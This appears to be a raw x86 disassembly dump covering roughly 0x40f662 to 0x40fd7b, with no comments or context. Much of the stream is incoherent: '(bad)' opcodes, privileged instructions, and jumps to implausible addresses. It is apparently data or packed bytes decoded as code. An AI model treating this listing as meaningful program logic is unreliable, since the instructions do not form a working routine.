  40f662:	mov    DWORD PTR [ebx+0x28],ebx
  40f665:	ret    0xff
  40f668:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  40f66e:	ret    
  40f66f:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f675:	add    BYTE PTR [ebp-0x7d],al
  40f678:	mov    DWORD PTR [eax],eax
  40f67a:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  40f681:	sar    bh,cl
  40f683:	test   BYTE PTR [eax+0x1],dl
  40f686:	inc    ebp
  40f687:	add    BYTE PTR [ebx],dh
  40f689:	test   BYTE PTR [ebx],0x84
  40f68c:	push   eax
  40f68d:	add    BYTE PTR [ebp+0x0],al
  40f690:	add    eax,0x86
  40f695:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f69b:	add    BYTE PTR [ecx],al
  40f69d:	add    BYTE PTR [eax],al
  40f69f:	mov    esi,0x550030
  40f6a4:	mov    ecx,DWORD PTR [edi]
  40f6a6:	sbb    al,0xda
  40f6a8:	jne    0x40f6aa
  40f6aa:	mov    edi,DWORD PTR [ecx]
  40f6ac:	xor    BYTE PTR [eax+eax*1],0x84
  40f6b0:	add    eax,DWORD PTR [eax]
  40f6b2:	cld    
  40f6b3:	add    BYTE PTR [ebp-0x4f],dh
  40f6b6:	mov    eax,DWORD PTR [ecx]
  40f6b8:	cld    
  40f6b9:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f6bf:	retf   0xe45
  40f6c2:	add    eax,edx
  40f6c4:	sbb    al,0xb7
  40f6c6:	dec    ebp
  40f6c7:	or     al,0x89
  40f6c9:	dec    ebp
  40f6ca:	sbb    al,0xf
  40f6cc:	inc    ebp
  40f6cd:	dec    eax
  40f6ce:	mov    eax,DWORD PTR [ebx]
  40f6d0:	sbb    al,0xf
  40f6d2:	nop
  40f6d3:	scas   al,BYTE PTR es:[edi]
  40f6d4:	add    DWORD PTR [eax],eax
  40f6d6:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f6dc:	mov    eax,gs
  40f6de:	add    bh,bh
  40f6e0:	mov    edi,edi
  40f6e2:	cmp    DWORD PTR [edi+0x72],edx
  40f6e5:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f6eb:	gs cmp al,0x0
  40f6ee:	je     0x40f6c6
  40f6f0:	push   eax
  40f6f1:	sar    BYTE PTR [eax],1
  40f6f3:	mov    bh,0x3e
  40f6f5:	push   cs
  40f6f6:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f6fc:	add    DWORD PTR [ecx+0x12],ebp
  40f6ff:	dec    edx
  40f700:	(bad)  
  40f701:	mov    eax,edx
  40f703:	in     al,dx
  40f704:	adc    DWORD PTR [ecx],esi
  40f706:	pop    esi
  40f707:	inc    ecx
  40f708:	leave  
  40f709:	or     DWORD PTR [eax],ebx
  40f70b:	gs push ebp
  40f70d:	add    ah,ch
  40f70f:	into   
  40f710:	in     al,dx
  40f711:	enter  0xb756,0xf0
  40f715:	push   cs
  40f716:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f720:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f726:	jnp    0x74417c2e
  40f72c:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f732:	add    BYTE PTR [edi],cl
  40f734:	mov    edi,DWORD PTR [ecx-0x78]
  40f737:	ltr    WORD PTR [ecx-0x7b]
  40f73b:	dec    DWORD PTR [edi]
  40f73d:	clc    
  40f73e:	out    0x45,eax
  40f740:	add    BYTE PTR [eax],cl
  40f742:	cmp    ebx,0xffffff8c
  40f745:	jge    0x40f747
  40f747:	jb     0x40f759
  40f749:	je     0x4ff7c9
  40f74f:	pop    edx
  40f750:	push   esi
  40f751:	mov    ecx,DWORD PTR [edi]
  40f753:	in     al,dx
  40f754:	rol    DWORD PTR [ebp+0x0],1
  40f757:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f75e:	cmp    DWORD PTR [ecx],0xfffffff0
  40f761:	hlt    
  40f762:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f768:	(bad)  
  40f76a:	push   eax
  40f76b:	jns    0xb840dbe9
  40f771:	lock push cs
  40f773:	ror    edx,0x3
  40f776:	test   BYTE PTR [ecx+0x5500e800],cl
  40f77c:	dec    eax
  40f77d:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f781:	(bad)  
  40f782:	mov    esi,0x7f33ff5f
  40f787:	inc    eax
  40f788:	test   DWORD PTR [edx],eax
  40f78a:	je     0x40f74c
  40f78c:	mov    ecx,ecx
  40f78e:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f792:	and    eax,DWORD PTR [eax+0xf0103]
  40f798:	jp     0x40f786
  40f79a:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f79e:	add    edx,DWORD PTR [edi+0x74]
  40f7a1:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f7a7:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f7ad:	je     0x40f732
  40f7af:	cmp    eax,edi
  40f7b1:	js     0x40f7d6
  40f7b3:	add    eax,0xeb0fc003
  40f7b8:	jns    0x40f745
  40f7ba:	vmread DWORD PTR [ecx+0x45],ebx
  40f7be:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f7c4:	adc    al,0x8b
  40f7c6:	jge    0x40f7dc
  40f7c8:	mov    edi,DWORD PTR [eax-0x4]
  40f7cb:	add    edi,DWORD PTR [edi]
  40f7cd:	or     bh,bh
  40f7cf:	push   ebp
  40f7d0:	push   es
  40f7d1:	mov    DWORD PTR [ebp-0x4],ebx
  40f7d4:	add    edi,esi
  40f7d6:	pop    es
  40f7d7:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f7dd:	mov    DWORD PTR [esp+esi*8],ecx
  40f7e0:	inc    ebp
  40f7e1:	pop    ebp
  40f7e2:	xor    DWORD PTR [esi-0x4],0x3b
  40f7e6:	add    edx,DWORD PTR [ecx+edi*1]
  40f7e9:	push   es
  40f7ea:	clc    
  40f7eb:	mov    bh,0xdb
  40f7ed:	jp     0x40f7a6
  40f7ef:	add    cl,BYTE PTR [esi]
  40f7f1:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f7f7:	test   edi,edi
  40f7f9:	je     0x40f7ef
  40f7fb:	mov    eax,ecx
  40f7fd:	or     BYTE PTR [ebx],al
  40f7ff:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f805:	jbe    0x40f879
  40f807:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f80d:	add    ecx,DWORD PTR [esi]
  40f80f:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f815:	add    eax,DWORD PTR [ebx-0x287af783]
  40f81b:	je     0x40f86a
  40f81d:	mov    DWORD PTR [ecx],edi
  40f81f:	mov    esi,eax
  40f821:	hlt    
  40f822:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f829:	jb     0x40f7eb
  40f82b:	jmp    0x40f818
  40f82d:	xor    esi,DWORD PTR [ebx]
  40f82f:	pop    edi
  40f830:	pop    esi
  40f831:	pop    ebx
  40f832:	ret    
  40f833:	ret    0x8b
  40f836:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f83c:	xor    DWORD PTR [ecx],0xc
  40f83f:	pushf  
  40f840:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  40f846:	rdmsr  
  40f848:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  40f84f:	dec    ebp
  40f850:	ret    
  40f851:	mov    edi,DWORD PTR [esi-0x4]
  40f854:	pop    eax
  40f855:	dec    ebp
  40f856:	jne    0x40f7e3
  40f858:	xor    edi,esp
  40f85a:	inc    eax
  40f85b:	dec    ebp
  40f85c:	jbe    0x40f8b1
  40f85e:	inc    eax
  40f85f:	pop    ebp
  40f860:	add    edx,DWORD PTR [esi+0x8]
  40f863:	push   esp
  40f864:	dec    eax
  40f865:	push   ecx
  40f866:	mov    eax,edi
  40f868:	and    al,0xf0
  40f86a:	jo     0x40f857
  40f86c:	mov    eax,DWORD PTR [ebx]
  40f86e:	sbb    BYTE PTR [ebp+0x4d],cl
  40f871:	mov    eax,DWORD PTR [ebx]
  40f873:	nop
  40f874:	or     BYTE PTR [eax],al
  40f876:	jne    0x40f8cf
  40f878:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  40f87e:	cld    
  40f87f:	xor    edi,edi
  40f881:	add    edi,DWORD PTR [ebp+0x3]
  40f884:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f88a:	js     0x40f810
  40f88c:	jae    0x40f890
  40f88e:	(bad)  
  40f890:	xor    al,0x5d
  40f892:	jmp    0x40f81f
  40f894:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f89b:	fdecstp 
  40f89d:	test   BYTE PTR [edi],ah
  40f89f:	add    bh,BYTE PTR [ebp+0x0]
  40f8a2:	add    ebx,DWORD PTR [ebp-0x77]
  40f8a5:	mov    edi,eax
  40f8a7:	cmp    al,0x0
  40f8aa:	adc    dh,BYTE PTR [ebx]
  40f8ac:	jge    0x40f8b1
  40f8ae:	mov    edi,DWORD PTR [ebx]
  40f8b0:	jl     0x40f8c1
  40f8b2:	clc    
  40f8b3:	dec    edi
  40f8b4:	jge    0x40f8b6
  40f8b6:	mov    eax,DWORD PTR [ebx]
  40f8b8:	jb     0x40f8c2
  40f8ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f8bd:	mov    edi,edi
  40f8bf:	xor    edx,DWORD PTR [eax]
  40f8c1:	add    edi,DWORD PTR [ebx]
  40f8c3:	mov    DWORD PTR [ebp-0x10],edi
  40f8c6:	inc    edi
  40f8c7:	pop    ebp
  40f8c8:	jge    0x40f905
  40f8ca:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40f8ce:	mov    edx,0xc05d87f0
  40f8d3:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40f8d7:	fimul  WORD PTR [eax]
  40f8d9:	fist   WORD PTR [ebp+0x1c]
  40f8dc:	in     al,dx
  40f8dd:	jne    0x40f8cb
  40f8df:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40f8e5:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40f8e9:	fdivp  st(0),st
  40f8eb:	fild   WORD PTR [ebp+0x4510f85c]
  40f8f1:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40f8f7:	inc    ebp
  40f8f8:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40f8fe:	mov    ebp,DWORD PTR [ebx-0x4]
  40f901:	adc    al,0x8b
  40f903:	rcl    DWORD PTR [eax],0x48
  40f906:	mov    esi,0x7080803
  40f90b:	fiadd  WORD PTR [ebp+0x4d]
  40f90e:	(bad)  
  40f90f:	mov    edx,DWORD PTR [edx-0x4]
  40f912:	mov    edx,DWORD PTR [ebp-0x4]
  40f915:	xor    ebx,DWORD PTR [ebx+0x330103]
  40f91b:	mov    DWORD PTR [edi+0x872dc],edi
  40f921:	xlat   BYTE PTR ds:[ebx]
  40f922:	into   
  40f923:	ffreep st(6)
  40f925:	retf   0x6c7
  40f928:	iret   
  40f929:	dec    ebp
  40f92a:	inc    ebp
  40f92b:	mov    DWORD PTR [ebx],edi
  40f92d:	fmul   QWORD PTR [edi]
  40f92f:	dec    ebp
  40f930:	jnp    0x40f965
  40f932:	add    BYTE PTR [ebx],al
  40f934:	mov    ecx,DWORD PTR [esp+edi*8]
  40f937:	inc    ebp
  40f938:	dec    ebp
  40f939:	lea    esi,[ebx]
  40f93b:	add    DWORD PTR [ebx],eax
  40f93d:	jb     0x40f97a
  40f93f:	add    BYTE PTR [edi],cl
  40f941:	inc    ebp
  40f942:	imul   eax,edi,0x858bd800
  40f948:	cld    
  40f949:	clc    
  40f94a:	mov    DWORD PTR [ebp+0x0],eax
  40f94d:	inc    DWORD PTR [eax]
  40f94f:	or     al,0xde
  40f951:	sbb    bh,0x1
  40f954:	retf   
  40f955:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40f95c:	dec    ebp
  40f95d:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40f963:	enter  0x12de,0xdf
  40f967:	inc    ebp
  40f968:	pop    ebp
  40f969:	dec    DWORD PTR [ebx-0x257f0ff4]
  40f96f:	add    DWORD PTR [edx],edx
  40f971:	add    BYTE PTR [ebp+0x50],dl
  40f974:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40f97a:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40f980:	or     ah,al
  40f982:	pop    ss
  40f983:	cdq    
  40f984:	push   ebp
  40f985:	clc    
  40f986:	mov    eax,DWORD PTR [ebp-0x4]
  40f989:	xor    edx,edx
  40f98b:	add    esi,DWORD PTR [ebx]
  40f98d:	cmp    eax,DWORD PTR [ebx]
  40f98f:	hlt    
  40f990:	cmp    DWORD PTR [ebx],esp
  40f992:	or     al,BYTE PTR [ebp+0xf]
  40f995:	mov    eax,DWORD PTR [edx]
  40f997:	loopne 0x40f999
  40f999:	(bad)  
  40f99a:	mov    ecx,esi
  40f99c:	cld    
  40f99d:	pushf  
  40f99e:	pop    ebp
  40f99f:	fwait
  40f9a0:	mov    esi,DWORD PTR [edx]
  40f9a2:	lock mov eax,eax
  40f9a5:	adc    BYTE PTR [ebx],al
  40f9a7:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40f9ae:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40f9b4:	dec    ebp
  40f9b5:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40f9bb:	(bad)  
  40f9bc:	iret   
  40f9bd:	inc    ebp
  40f9be:	(bad)  
  40f9bf:	jne    0x40fa0e
  40f9c1:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40f9c7:	(bad)  
  40f9c8:	cmp    ebx,eax
  40f9ca:	je     0x40f952
  40f9cc:	add    edi,edi
  40f9ce:	or     bh,bh
  40f9d0:	dec    ebp
  40f9d1:	inc    ebp
  40f9d2:	mov    esi,DWORD PTR [ebx]
  40f9d4:	cld    
  40f9d5:	add    ecx,esi
  40f9d7:	cmp    ecx,DWORD PTR [eax-0xc]
  40f9da:	mov    edx,DWORD PTR [edi]
  40f9dc:	or     BYTE PTR [ebp-0x7c],al
  40f9df:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  40f9e5:	test   BYTE PTR [ebx+ebx*4],cl
  40f9e8:	inc    ebp
  40f9e9:	xor    bh,BYTE PTR [esi]
  40f9eb:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  40f9f2:	jne    0x40f9bb
  40f9f4:	mov    ebp,esp
  40f9f6:	fcomp  DWORD PTR [ebx]
  40f9f8:	add    BYTE PTR [ecx],al
  40f9fa:	inc    DWORD PTR [ebp-0x75]
  40f9fd:	(bad)  
  40f9fe:	cld    
  40f9ff:	add    al,0xce
  40fa01:	mov    ecx,edi
  40fa03:	cld    
  40fa04:	inc    ebp
  40fa05:	fidivr WORD PTR [ebx]
  40fa07:	fbstp  TBYTE PTR [ebp-0x3e]
  40fa0a:	mov    eax,DWORD PTR [eax]
  40fa0c:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fa12:	fadd   st,st(7)
  40fa14:	add    BYTE PTR [ebp-0x1],al
  40fa17:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa1a:	inc    ebp
  40fa1b:	mov    bh,0xc7
  40fa1e:	loopne 0x40fa65
  40fa20:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fa26:	sbb    dh,BYTE PTR [ebx]
  40fa28:	pushf  
  40fa29:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fa2f:	mov    eax,edi
  40fa31:	cwde   
  40fa32:	inc    ebp
  40fa33:	inc    ebp
  40fa34:	jne    0x40f9c1
  40fa36:	mov    esp,esp
  40fa38:	clc    
  40fa39:	add    al,0x4d
  40fa3b:	mov    DWORD PTR [ebx],esi
  40fa3d:	or     al,0x33
  40fa3f:	inc    ebp
  40fa40:	lea    ecx,[ebx-0x398d13fd]
  40fa46:	add    bh,al
  40fa48:	inc    ebp
  40fa49:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fa50:	add    ebp,esp
  40fa52:	shufps xmm1,xmm3,0xc7
  40fa56:	(bad)  
  40fa57:	jmp    0x74863580
  40fa5c:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fa62:	hlt    
  40fa63:	mov    ecx,DWORD PTR [edi]
  40fa65:	fadd   DWORD PTR [ebp+0x0]
  40fa68:	xor    ecx,DWORD PTR [edi]
  40fa6a:	add    ecx,ecx
  40fa6c:	cmp    edi,edi
  40fa6e:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fa72:	(bad)  
  40fa73:	jmp    0x40fa00
  40fa75:	mov    edi,esp
  40fa77:	or     al,0xc6
  40fa79:	inc    ebp
  40fa7a:	(bad)  
  40fa7b:	mov    eax,DWORD PTR [ebp+0x10]
  40fa7e:	jne    0x40fa09
  40fa80:	mov    eax,DWORD PTR [ecx]
  40fa82:	clc    
  40fa83:	add    BYTE PTR [ebp-0x40],cl
  40fa86:	xor    edx,DWORD PTR [eax-0x73]
  40fa89:	jne    0x40fa8c
  40fa8b:	push   DWORD PTR [edx+0x8]
  40fa8e:	add    BYTE PTR [ebp+0x45],al
  40fa91:	mov    ebp,ecx
  40fa93:	cld    
  40fa94:	add    BYTE PTR [ebp+0x0],cl
  40fa97:	xor    eax,DWORD PTR [ebp+0x3]
  40fa9a:	mov    DWORD PTR [ebx],edi
  40fa9c:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40faa2:	sub    eax,0x5d330e4d
  40faa7:	lea    esi,[ebx]
  40faa9:	add    DWORD PTR [ebx],eax
  40faab:	jb     0x40fa96
  40faad:	add    BYTE PTR [eax],al
  40faaf:	inc    ebp
  40fab0:	add    bl,ch
  40fab2:	inc    ebp
  40fab3:	mov    esi,DWORD PTR [ebx]
  40fab5:	or     al,0x3
  40fab7:	(bad)  
  40fab8:	mov    edi,eax
  40faba:	in     al,dx
  40fabb:	scas   eax,DWORD PTR es:[edi]
  40fabc:	inc    ebp
  40fabd:	mov    esi,DWORD PTR [ebx]
  40fabf:	in     al,0x3
  40fac1:	add    al,0x89
  40fac3:	mov    ecx,DWORD PTR [eax+edi*8]
  40fac6:	dec    ebp
  40fac7:	(bad)  
  40fac8:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  40facf:	mov    ecx,eax
  40fad1:	cld    
  40fad2:	push   es
  40fad3:	dec    ebp
  40fad4:	add    al,0x33
  40fad6:	mov    DWORD PTR [ebx],eax
  40fad8:	in     al,dx
  40fad9:	cmp    DWORD PTR [ebp-0x67],eax
  40fadc:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fae2:	mov    edx,DWORD PTR [ebp-0x4]
  40fae5:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fae8:	xor    eax,DWORD PTR [ebp+0x3]
  40faeb:	cmp    DWORD PTR [ebx],0x8b32749a
  40faf1:	xor    edi,esp
  40faf3:	jmp    0xff74f845
  40faf8:	add    ecx,DWORD PTR [ebp-0x3f]
  40fafb:	xor    ebx,DWORD PTR [edi]
  40fafd:	add    eax,ecx
  40faff:	cmp    ebx,DWORD PTR [eax]
  40fb01:	mov    ecx,DWORD PTR [ebp-0x4]
  40fb04:	mov    ecx,DWORD PTR [eax]
  40fb06:	adc    BYTE PTR [ebp-0x80],al
  40fb09:	jmp    0x40fb0c
  40fb0b:	mov    eax,DWORD PTR [eax]
  40fb0d:	cld    
  40fb0e:	mov    bh,0xc6
  40fb10:	push   ecx
  40fb11:	(bad)  
  40fb12:	jne    0x40fb72
  40fb14:	dec    ecx
  40fb16:	or     BYTE PTR [ecx+ebx*1],cl
  40fb19:	push   ebp
  40fb1a:	inc    ebp
  40fb1b:	in     al,dx
  40fb1c:	add    ebp,esp
  40fb1e:	or     bh,al
  40fb20:	dec    ebp
  40fb21:	cld    
  40fb22:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fb28:	xor    DWORD PTR [edx],0x2
  40fb2b:	pushf  
  40fb2c:	dec    DWORD PTR [ebx+0x45510cf4]
  40fb32:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  40fb38:	mov    edx,DWORD PTR [ecx+0xc]
  40fb3b:	xor    eax,esi
  40fb3d:	mov    edx,0xc172c7
  40fb42:	inc    ebp
  40fb43:	mov    esi,DWORD PTR [ebp+0x8]
  40fb46:	mov    eax,edx
  40fb48:	call   0x84c5c23d
  40fb4d:	add    DWORD PTR [ebx-0x76bace00],ebx
  40fb53:	mov    ebp,eax
  40fb55:	or     BYTE PTR [eax],dl
  40fb57:	jo     0x40fba6
  40fb59:	push   edi
  40fb5a:	xor    esi,DWORD PTR [ebp+0x3]
  40fb5d:	(bad)  
  40fb5e:	pmulhuw mm0,mm1
  40fb61:	test   DWORD PTR [ebp-0x8],ecx
  40fb64:	mov    DWORD PTR [ebp-0x67],eax
  40fb67:	mov    eax,DWORD PTR [ebp-0x4]
  40fb6a:	xor    edi,DWORD PTR [ebp-0x73]
  40fb6d:	xor    eax,DWORD PTR [ebx]
  40fb6f:	xor    esi,DWORD PTR [edx+0x3]
  40fb72:	add    BYTE PTR [ecx],bh
  40fb74:	inc    ebp
  40fb75:	(bad)  
  40fb76:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fb7c:	mov    DWORD PTR [eax],0x750f0004
  40fb82:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fb88:	lock add BYTE PTR [ebp+0x0],cl
  40fb8c:	mov    esi,DWORD PTR [ebp-0x18]
  40fb8f:	mov    ebp,edx
  40fb91:	or     al,0x72
  40fb93:	ja     0x40fb95
  40fb95:	mov    edx,esi
  40fb97:	cld    
  40fb98:	(bad)  
  40fb9b:	cli    
  40fb9c:	mov    esi,DWORD PTR [ebp-0x4]
  40fb9f:	cmp    ecx,esi
  40fba1:	bswap  edi
  40fba3:	(bad)
  40fba7:	mov    esi,DWORD PTR [ebp-0x4]
  40fbaa:	mov    esi,ecx
  40fbac:	clc    
  40fbad:	repnz add esi,DWORD PTR [ebp+0x45]
  40fbb1:	push   ebx
  40fbb2:	xor    eax,DWORD PTR [ebp+0x3]
  40fbb5:	cmp    al,0x5f
  40fbb7:	pushf  
  40fbb8:	pop    ebx
  40fbb9:	jmp    0x40fc80
  40fbbe:	mov    esi,DWORD PTR [ebp-0x7d]
  40fbc1:	xor    ebp,DWORD PTR [eax]
  40fbc3:	lea    eax,[ebp-0x8]
  40fbc6:	xor    edx,esi
  40fbc8:	pushf  
  40fbc9:	out    dx,eax
  40fbca:	(bad)  
  40fbcb:	neg    eax
  40fbcd:	ins    DWORD PTR es:[edi],dx
  40fbce:	test   esi,edi
  40fbd0:	clc    
  40fbd1:	pop    esp
  40fbd2:	inc    ebp
  40fbd3:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fbd9:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fbdf:	add    cl,al
  40fbe1:	jne    0x40fb7e
  40fbe3:	mov    esi,DWORD PTR [edx]
  40fbe5:	in     al,dx
  40fbe6:	push   esi
  40fbe7:	xor    BYTE PTR [ebp-0xe],dh
  40fbea:	add    edi,esi
  40fbec:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fbf2:	add    cl,bh
  40fbf4:	mov    edi,DWORD PTR [ebp+0x8]
  40fbf7:	mov    DWORD PTR [ebp-0x14],esi
  40fbfa:	add    esi,DWORD PTR [ebp+0x3c]
  40fbfd:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fc03:	mov    ah,0x3e
  40fc05:	fwait
  40fc06:	pushf  
  40fc07:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fc0d:	jne    0x40fb9a
  40fc0f:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fc12:	icebp  
  40fc13:	icebp  
  40fc14:	shl    edx,0xf2
  40fc17:	(bad)  
  40fc18:	mov    ah,0x16
  40fc1a:	push   eax
  40fc1b:	jne    0x40fbb0
  40fc1d:	mov    ecx,DWORD PTR [edi]
  40fc1f:	in     al,dx
  40fc20:	jmp    0x40fc13
  40fc22:	add    dl,dh
  40fc24:	mov    edi,esi
  40fc26:	or     al,0x8
  40fc28:	inc    ebp
  40fc29:	jne    0x40fc2e
  40fc2b:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fc31:	ret    
  40fc32:	or     bh,bh
  40fc34:	jge    0x40fc1e
  40fc36:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fc3c:	xor    edi,eax
  40fc3e:	add    esi,DWORD PTR [ebp-0x77]
  40fc41:	mov    ebx,esp
  40fc43:	clc    
  40fc44:	neg    DWORD PTR [ebp-0x7c]
  40fc47:	xor    eax,DWORD PTR [eax]
  40fc49:	cmp    eax,DWORD PTR [eax]
  40fc4b:	repz jne 0x40fbe3
  40fc4e:	xor    eax,DWORD PTR [ecx]
  40fc50:	add    ebx,DWORD PTR [eax]
  40fc52:	mov    DWORD PTR [ebp-0x8],eax
  40fc55:	mov    eax,edi
  40fc57:	cld    
  40fc58:	lock pop eax
  40fc5a:	test   DWORD PTR [ebx],esi
  40fc5c:	clc    
  40fc5d:	add    edx,DWORD PTR [edi-0x740bff77]
  40fc63:	fdivp  st(4),st
  40fc65:	test   ecx,esi
  40fc67:	(bad)  
  40fc68:	jnp    0x40fc69
  40fc6a:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fc70:	jae    0x40fbfd
  40fc72:	sub    edi,esp
  40fc74:	(bad)  
  40fc75:	shl    DWORD PTR [eax-0x3e],0x89
  40fc79:	leave  
  40fc7a:	call   0x8196b387
  40fc7f:	in     al,dx
  40fc80:	(bad)  
  40fc81:	in     al,dx
  40fc82:	add    bh,al
  40fc84:	mov    esp,edi
  40fc86:	in     al,dx
  40fc87:	test   DWORD PTR [ebp-0x8],edi
  40fc8a:	mov    eax,DWORD PTR [ebp+0x2b]
  40fc8d:	xor    al,BYTE PTR [ebx]
  40fc8f:	pushf  
  40fc90:	jnp    0x572ff8c9
  40fc96:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  40fc9a:	loopne 0x40fccf
  40fc9c:	jne    0x40fc59
  40fc9e:	mov    esi,DWORD PTR [edx-0x20]
  40fca1:	add    BYTE PTR [ebp-0x3d],bh
  40fca4:	xor    eax,DWORD PTR [ebp-0x73]
  40fca7:	mov    edi,DWORD PTR [esi]
  40fca9:	cld    
  40fcaa:	jb     0x40fc72
  40fcac:	add    bl,al
  40fcae:	jne    0x40fcf5
  40fcb0:	mov    edx,DWORD PTR [edi-0x10]
  40fcb3:	jge    0x40fd32
  40fcb5:	mov    esi,DWORD PTR [ebx]
  40fcb7:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fcbb:	xor    esi,DWORD PTR [ebp-0x77]
  40fcbe:	mov    esi,eax
  40fcc0:	lock inc ebp
  40fcc2:	jge    0x40fcf5
  40fcc4:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fccb:	dec    ebp
  40fccc:	mov    esi,DWORD PTR [ebx]
  40fcce:	loopne 0x40fc59
  40fcd0:	jge    0x40fcca
  40fcd2:	add    DWORD PTR [ebp-0x7d],eax
  40fcd5:	icebp  
  40fcd6:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fcdd:	dec    ebp
  40fcde:	hlt    
  40fcdf:	xor    ebx,DWORD PTR [ebp-0x77]
  40fce2:	mov    esi,esp
  40fce4:	in     al,0x45
  40fce6:	jge    0x40fd25
  40fce8:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fcef:	dec    ebp
  40fcf0:	push   esp
  40fcf1:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  40fcf7:	inc    ebp
  40fcf8:	hlt    
  40fcf9:	xor    DWORD PTR [ebp-0x61],esi
  40fcfc:	mov    edi,DWORD PTR [eax+0xf19504]
  40fd02:	repnz mov DWORD PTR [ebp+0x20],ebx
  40fd06:	cmp    eax,DWORD PTR [ebp+0xf]
  40fd09:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fd0d:	fistp  WORD PTR [ebx+0x0]
  40fd10:	inc    ebp
  40fd11:	mov    ebx,DWORD PTR [edi+0xc]
  40fd14:	add    eax,eax
  40fd16:	inc    ebp
  40fd17:	test   BYTE PTR [ebx],dh
  40fd19:	add    eax,DWORD PTR [ebx]
  40fd1b:	add    BYTE PTR [esi+0x45],bl
  40fd1e:	ret    0x85
  40fd21:	jnp    0x544180f0
  40fd27:	inc    bp
  40fd29:	inc    ebp
  40fd2a:	xor    DWORD PTR [ecx+0xc78a9c],edi
  40fd30:	fdiv   QWORD PTR [ebx]
  40fd32:	test   DWORD PTR [ecx+0x453bf8],edi
  40fd38:	push   ebx
  40fd39:	add    edi,DWORD PTR [esi+0x708088b]
  40fd3f:	cmp    esi,eax
  40fd41:	setnp  BYTE PTR [ecx-0x74fcffce]
  40fd48:	mov    esp,edi
  40fd4a:	call   0x33cc429c
  40fd4f:	or     BYTE PTR [ebx],al
  40fd51:	inc    ecx
  40fd52:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40fd58:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fd5e:	lock add cl,al
  40fd61:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fd68:	mov    ch,0x45
  40fd6a:	clc    
  40fd6b:	xor    eax,DWORD PTR [ebp+0x3]
  40fd6e:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fd74:	inc    ebp
  40fd75:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fd7b:	mov    edi,eax
